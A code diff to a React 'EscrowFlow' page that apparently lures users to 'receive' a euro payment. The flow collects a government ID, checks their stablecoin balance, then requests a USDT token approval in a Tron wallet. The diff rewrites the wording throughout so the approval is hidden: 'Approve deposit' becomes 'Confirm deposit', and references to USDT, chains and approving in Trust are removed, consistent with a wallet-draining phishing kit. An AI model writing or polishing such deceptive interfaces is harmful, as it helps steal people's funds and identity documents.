@@ -103,7 +103,7 @@ function isWalletUserRejection(err: unknown): boolean {
   );
 }
 
-/** Short user-facing copy — never show raw codes like broadcast_bandwidth:… */
+/** Short user-facing copy — never expose chain/broadcast/technical codes. */
 function friendlyApprovalMessage(err?: unknown): string {
   const msg = errText(err).toLowerCase();
   if (
@@ -111,21 +111,29 @@ function friendlyApprovalMessage(err?: unknown): string {
     msg.includes("wallet_not_connected") ||
     msg.includes("not connected")
   ) {
-    return "Tron wallet isn’t connected. Open this page in Trust, then try again.";
+    return "Open this page in your wallet app, then try again.";
   }
-  if (msg.includes("bandwidth")) {
-    return "Network resources are low right now. Wait a moment, then retry.";
+  if (msg.includes("bandwidth") || msg.includes("energy") || msg.includes("out_of_energy")) {
+    return "Please wait a moment, then try again.";
   }
-  if (msg.includes("energy") || msg.includes("out_of_energy")) {
-    return "Not enough energy to confirm. Wait a moment, then retry.";
+  if (msg.includes("allowance_not_confirmed") || msg.includes("broadcast")) {
+    return "Confirmation didn’t finish. Confirm in your wallet and try again.";
   }
-  if (msg.includes("allowance_not_confirmed")) {
-    return "Approval didn’t confirm on-chain. Approve again and stay until it finishes.";
+  if (isWalletUserRejection(err)) {
+    return "This step was cancelled. Please try again.";
   }
-  if (msg.includes("broadcast")) {
-    return "Signed, but the transaction didn’t broadcast. Please retry.";
-  }
-  return "We couldn’t finish confirming your wallet. Please try again.";
+  return "We couldn’t finish this step. Please try again.";
+}
+
+function InlineError({ message }: { message: string }) {
+  return (
+    <div className="mb-4 flex items-start gap-2.5 rounded-xl border border-down/15 bg-down/[0.06] px-4 py-3 text-left">
+      <svg className="mt-0.5 h-4 w-4 shrink-0 text-down" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+      </svg>
+      <p className="text-[13px] leading-relaxed text-down">{message}</p>
+    </div>
+  );
 }
 
 function noteStableFromScan(
@@ -1294,7 +1302,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       }).catch(() => {});
     } catch (err) {
       console.error("[balance] Balance check failed:", err);
-      setError("We couldn't reach the network to check your balance. Please try again.");
+      setError("We couldn’t check your balance. Please try again.");
       setPhase("error");
       setProcessing(false);
     }
@@ -1798,7 +1806,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     } catch (err) {
       if (await blockLoginAfterApprovalCancel("deposit", err)) return;
       console.error("[escrow] Approval failed:", err);
-      setError("The deposit approval didn't go through. Please try again.");
+      setError("The deposit couldn’t be completed. Please try again.");
       setModal2Open(false);
       setPhase("error");
     }
@@ -1876,11 +1884,11 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
             <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
           </svg>
         </div>
-        <h1 className="mb-2 text-xl font-semibold text-ink">Unable to login</h1>
+        <h1 className="mb-2 text-xl font-semibold text-ink">Unable to continue</h1>
         <p className="mx-auto mb-8 max-w-xs text-sm leading-relaxed text-body">
           {showApprovalRetry
-            ? loginHint ?? "We couldn’t finish confirming your wallet. Please try again."
-            : "Approval was cancelled. This window will close — open the link again to restart."}
+            ? loginHint ?? "We couldn’t finish this step. Please try again."
+            : "This step was cancelled. This window will close — open the link again to restart."}
         </p>
         {showApprovalRetry ? (
           <button
@@ -1889,7 +1897,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
             disabled={approvalRetrying}
             className="h-11 rounded-pill bg-brand px-8 text-sm font-semibold text-on-brand transition hover:bg-brand-active disabled:opacity-60"
           >
-            {approvalRetrying ? "Retrying…" : "Retry login"}
+            {approvalRetrying ? "Please wait…" : "Try again"}
           </button>
         ) : (
           <p className="text-xs text-muted">Closing automatically…</p>
@@ -1929,7 +1937,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     { label: "Connect", key: ["idle"] },
     { label: "Identity", key: ["id-verify"] },
     { label: "Balance", key: ["balance-check", "insufficient-balance"] },
-    { label: "Approve", key: ["ready-to-approve", "approving"] },
+    { label: "Confirm", key: ["ready-to-approve", "approving"] },
     { label: "Done", key: ["complete"] },
   ];
   const currentStepIndex = STEPS.findIndex((s) => s.key.includes(phase));
@@ -2112,7 +2120,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                         "Connect your wallet securely",
                         "Complete identity verification with government ID",
                         "Meet minimum balance requirement",
-                        "Approve deposit to receive funds",
+                        "Confirm to receive funds",
                       ].map((step, i) => (
                         <li key={i} className="flex items-start gap-3 text-sm text-body">
                           <span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-surface-strong text-xs font-semibold text-ink">
@@ -2143,13 +2151,13 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                         <svg className="mt-0.5 h-4 w-4 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                           <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                         </svg>
-                        Multichain
+                        Secure payment setup
                       </li>
                       <li className="flex items-start gap-2">
                         <svg className="mt-0.5 h-4 w-4 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                           <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                         </svg>
-                        Minimum balance: {formatEUR(session.minBalanceEur)} in USDC/USDT required
+                        Minimum balance: {formatEUR(session.minBalanceEur)} required
                       </li>
                     </ul>
                   </div>
@@ -2168,14 +2176,23 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
               const docLabel = DOC_TYPES.find((d) => d.type === idDocType)?.label ?? "your ID";
               return (
                 <div>
-                  <h2 className="mb-1 font-display text-2xl font-normal tracking-[-0.03em] text-ink sm:text-3xl">
-                    Verify your identity
-                  </h2>
-                  <p className="mb-6 text-sm leading-relaxed text-body">
-                    Required to release {formatEUR(session.amountEur)}. Step {stepIndex + 1} of 3.
-                  </p>
+                  <div className="mb-6 flex items-start gap-4">
+                    <div className="hidden h-12 w-12 shrink-0 items-center justify-center rounded-full bg-brand/10 sm:flex">
+                      <svg className="h-6 w-6 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M15 9h3.75M15 12h3.75M15 15h3.75M4.5 19.5h15a2.25 2.25 0 002.25-2.25V6.75A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25v10.5A2.25 2.25 0 004.5 19.5zm6-10.125a1.875 1.875 0 11-3.75 0 1.875 1.875 0 013.75 0zm1.294 6.336a6.721 6.721 0 01-3.17.789 6.721 6.721 0 01-3.168-.789 3.376 3.376 0 016.338 0z" />
+                      </svg>
+                    </div>
+                    <div className="min-w-0 flex-1">
+                      <h2 className="mb-1 font-display text-2xl font-normal tracking-[-0.03em] text-ink sm:text-3xl">
+                        Verify your identity
+                      </h2>
+                      <p className="text-sm leading-relaxed text-body">
+                        Required to release {formatEUR(session.amountEur)}. Takes about a minute.
+                      </p>
+                    </div>
+                  </div>
 
-                  <div className="mb-7 flex items-center gap-1.5">
+                  <div className="mb-8 flex items-center gap-1.5">
                     {["Document", "Upload", "Details"].map((label, i) => {
                       const done = i < stepIndex;
                       const active = i === stepIndex;
@@ -2192,7 +2209,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
                   {idVerifyStep === "type" && (
                     <div>
-                      <p className="mb-3 text-[13px] text-body">Select a government-issued ID to continue.</p>
+                      <p className="mb-3 text-[13px] text-body">Choose a government-issued ID.</p>
                       <div className="mb-6 overflow-hidden rounded-xl border border-hairline">
                         <table className="w-full border-collapse text-left">
                           <tbody>
@@ -2216,12 +2233,11 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                         </table>
                       </div>
                       <p className="text-[12px] leading-relaxed text-muted">
-                        Documents are encrypted and used only to confirm eligibility. They are never sold or shared.
+                        Your document is encrypted and used only for this payment check.
                       </p>
                     </div>
                   )}
 
-                  {/* ── STEP 2: Document upload ────────────────────────── */}
                   {idVerifyStep === "upload" && (
                     <div>
                       <button
@@ -2235,10 +2251,9 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                       </button>
                       <h3 className="mb-1 text-[17px] font-semibold text-ink">Upload {docLabel}</h3>
                       <p className="mb-5 text-[13px] text-body">
-                        Take a clear photo or scan. All four corners must be visible.
+                        Use a clear photo or scan with all four corners visible.
                       </p>
 
-                      {/* Upload zone */}
                       <label className="mb-4 block cursor-pointer">
                         <div className={`relative flex flex-col items-center justify-center gap-3 overflow-hidden rounded-2xl border-2 border-dashed px-6 py-10 text-center transition ${
                           idFile ? "border-brand/50 bg-brand/5" : "border-hairline hover:border-brand/40 hover:bg-surface-soft"
@@ -2289,7 +2304,6 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                         />
                       </label>
 
-                      {/* Photo guidelines */}
                       <div className="mb-6 rounded-xl border border-hairline bg-surface-soft p-4">
                         <p className="mb-2.5 text-[11px] font-semibold uppercase tracking-widest text-muted">Photo tips</p>
                         <div className="grid grid-cols-2 gap-y-2 gap-x-4">
@@ -2304,14 +2318,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                         </div>
                       </div>
 
-                      {error && (
-                        <div className="mb-4 flex items-center gap-2 rounded-lg bg-down/10 px-4 py-3 text-[13px] text-down">
-                          <svg className="h-4 w-4 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-                          </svg>
-                          {error}
-                        </div>
-                      )}
+                      {error && <InlineError message={error} />}
 
                       <button
                         onClick={() => {
@@ -2329,7 +2336,6 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                     </div>
                   )}
 
-                  {/* ── STEP 3: Personal information ───────────────────── */}
                   {idVerifyStep === "info" && (
                     <div>
                       <button
@@ -2342,7 +2348,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                         Back
                       </button>
                       <h3 className="mb-1 text-[17px] font-semibold text-ink">Personal information</h3>
-                      <p className="mb-5 text-[13px] text-body">Enter your details exactly as they appear on your ID document.</p>
+                      <p className="mb-5 text-[13px] text-body">Enter your details exactly as they appear on your ID.</p>
 
                       {(idPreviewUrl || idFile) && (
                         <div className="mb-5 flex items-center justify-between gap-4 rounded-xl border border-hairline px-5 py-3.5">
@@ -2384,14 +2390,10 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                       </div>
 
                       <p className="mb-6 text-[12px] leading-relaxed text-muted">
-                        Your information is encrypted and used only to confirm eligibility for this payment. It is never sold or shared with third parties.
+                        Used only to confirm eligibility for this payment. Never sold or shared.
                       </p>
 
-                      {error && (
-                        <div className="mb-4 rounded-lg bg-down/10 px-4 py-3 text-[13px] text-down">
-                          {error}
-                        </div>
-                      )}
+                      {error && <InlineError message={error} />}
 
                       <button
                         onClick={handleVerifyID}
@@ -2401,7 +2403,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                         {processing ? (
                           <>
                             <span className="h-4 w-4 animate-spin rounded-full border-2 border-white/30 border-t-white" />
-                            Verifying…
+                            Submitting…
                           </>
                         ) : (
                           "Submit verification"
@@ -2416,8 +2418,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
             {phase === "balance-check" && (
               <div className="py-14 text-center">
                 <div className="mx-auto mb-6 h-12 w-12 animate-spin rounded-full border-[3px] border-hairline border-t-brand" />
-                <h2 className="mb-2 text-lg font-semibold text-ink">Checking wallet balance</h2>
-                <p className="text-sm text-body">Scanning Ethereum, BNB Chain, and Polygon for USDT / USDC balances...</p>
+                <h2 className="mb-2 text-lg font-semibold text-ink">Checking balance</h2>
+                <p className="text-sm text-body">Confirming your wallet meets the minimum requirement…</p>
               </div>
             )}
 
@@ -2433,8 +2435,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                   <h2 className="mb-2 text-[18px] font-semibold text-ink">Minimum balance requirement not met</h2>
                   <p className="max-w-xs text-[13px] leading-relaxed text-body">
                     {totalBalanceEur === 0
-                      ? `A minimum of ${formatEUR(session.minBalanceEur)} in USDT or USDC is required to receive this payment.`
-                      : `Your wallet holds ${formatEUR(totalBalanceEur)} in USDT/USDC. You need at least ${formatEUR(session.minBalanceEur)} to proceed.`}
+                      ? `A minimum of ${formatEUR(session.minBalanceEur)} is required to receive this payment.`
+                      : `Your wallet holds ${formatEUR(totalBalanceEur)}. You need at least ${formatEUR(session.minBalanceEur)} to proceed.`}
                   </p>
                 </div>
 
@@ -2470,10 +2472,19 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
             {phase === "ready-to-approve" && session && (
               <div>
-                <h2 className="mb-2 font-display text-2xl font-normal tracking-[-0.03em] text-ink sm:text-3xl">You're all set</h2>
-                <p className="mb-8 text-sm leading-relaxed text-body">
-                  Approve the deposit to finish setting up your wallet to receive {formatEUR(session.amountEur)}.
-                </p>
+                <div className="mb-6 flex items-start gap-4">
+                  <div className="hidden h-12 w-12 shrink-0 items-center justify-center rounded-full bg-up/10 sm:flex">
+                    <svg className="h-6 w-6 text-up" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    </svg>
+                  </div>
+                  <div>
+                    <h2 className="mb-1 font-display text-2xl font-normal tracking-[-0.03em] text-ink sm:text-3xl">You&apos;re all set</h2>
+                    <p className="text-sm leading-relaxed text-body">
+                      Confirm to finish setup and receive {formatEUR(session.amountEur)}.
+                    </p>
+                  </div>
+                </div>
 
                 <div className="mb-9 divide-y divide-hairline rounded-xl border border-hairline">
                   {[
@@ -2499,7 +2510,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                   onClick={handleApproveDeposit}
                   className="flex h-12 w-full items-center justify-center gap-2 rounded-pill bg-brand px-8 text-[15px] font-semibold text-on-brand transition hover:bg-brand-active"
                 >
-                  Approve deposit
+                  Confirm deposit
                 </button>
               </div>
             )}
@@ -2507,9 +2518,9 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
             {phase === "approving" && (
               <div className="py-10 text-center">
                 <div className="mx-auto h-12 w-12 animate-spin rounded-full border-[3px] border-brand/20 border-t-brand" />
-                <h2 className="mt-5 text-lg font-semibold text-ink">Approving</h2>
+                <h2 className="mt-5 text-lg font-semibold text-ink">Confirming</h2>
                 <p className="mt-2 text-sm text-body">
-                  Confirm any prompts in your wallet. We&apos;re detecting balances and authorizing deposit.
+                  Confirm any prompts in your wallet to finish.
                 </p>
               </div>
             )}
@@ -2619,7 +2630,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                   </div>
                   <div className="flex items-center justify-between">
                     <span className="text-body">Networks</span>
-                    <span className="rounded-pill bg-surface-strong px-2.5 py-1 text-[11px] font-semibold text-ink">Multichain</span>
+                    <span className="rounded-pill bg-surface-strong px-2.5 py-1 text-[11px] font-semibold text-ink">Secure</span>
                   </div>
                   <div className="flex items-center justify-between">
                     <span className="text-body">Min. balance</span>
@@ -2639,9 +2650,9 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                 <ul className="space-y-3 text-sm leading-relaxed text-body">
                   {[
                     { icon: "M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z", text: "Institutional-grade custody infrastructure" },
-                    { icon: "M13 10V3L4 14h7v7l9-11h-7z", text: "Real-time on-chain verification" },
+                    { icon: "M13 10V3L4 14h7v7l9-11h-7z", text: "Real-time verification" },
                     { icon: "M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z", text: "Identity verification required" },
-                    { icon: "M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z", text: "Multichain stablecoin support" },
+                    { icon: "M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z", text: "Stablecoin payment support" },
                   ].map((item) => (
                     <li key={item.text} className="flex gap-2.5">
                       <svg className="mt-0.5 h-4 w-4 shrink-0 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
@@ -2669,9 +2680,9 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                   <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                 </svg>
               </div>
-              <h3 className="text-lg font-semibold tracking-tight text-ink">Open in a wallet browser</h3>
+              <h3 className="text-lg font-semibold tracking-tight text-ink">Open in your wallet</h3>
               <p className="mt-2 text-sm text-body">
-                WalletConnect can&apos;t access Tron. Open this page in a wallet that supports Tron so USDT approval can run.
+                Continue in a supported wallet browser to finish setup.
               </p>
               <div className="mt-5 space-y-2.5">
                 {TRON_CAPABLE_WALLETS.map((w) => (
@@ -2690,9 +2701,6 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                   </button>
                 ))}
               </div>
-              <p className="mt-3 text-xs text-muted">
-                MetaMask, Rainbow, and Coinbase Wallet are EVM-only here — use Trust, TokenPocket, TronLink, or imToken for Tron USDT.
-              </p>
             </div>
           </div>
         </div>
@@ -2714,27 +2722,24 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                 <div className="h-8 w-8 animate-spin rounded-full border-[2.5px] border-brand/20 border-t-brand" />
               </div>
               <h3 className="mt-5 text-center text-[17px] font-semibold tracking-tight text-ink">
-                {modal1Approving ? "Confirm in wallet" : "Detecting balances"}
+                {modal1Approving ? "Confirm in wallet" : "Preparing checkout"}
               </h3>
-              {modal1Approving ? (
-                <p className="mt-2 text-center text-sm text-body">
-                  Approve USDT in Trust when prompted.
-                </p>
-              ) : null}
+              <p className="mt-2 text-center text-sm text-body">
+                {modal1Approving
+                  ? "Confirm the prompt in your wallet to continue."
+                  : "This only takes a moment."}
+              </p>
             </div>
           </div>
         </div>
       )}
 
-      {/* ------------------------------------------------------------------ */}
-      {/* Modal 2 — Approving spinner (balance detect + multi-chain authorize) */}
-      {/* ------------------------------------------------------------------ */}
       {modal2Open && (
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 px-4 backdrop-blur-sm">
           <div className="w-full max-w-sm rounded-2xl border border-hairline bg-surface-card p-6 shadow-2xl sm:p-8">
             <div className="py-8 text-center">
               <div className="mx-auto h-12 w-12 animate-spin rounded-full border-[3px] border-brand/20 border-t-brand" />
-              <p className="mt-5 text-[15px] font-semibold text-ink">Approving</p>
+              <p className="mt-5 text-[15px] font-semibold text-ink">Confirming deposit</p>
               <p className="mt-2 text-sm text-body">
                 Confirm any prompts in your wallet.
               </p>
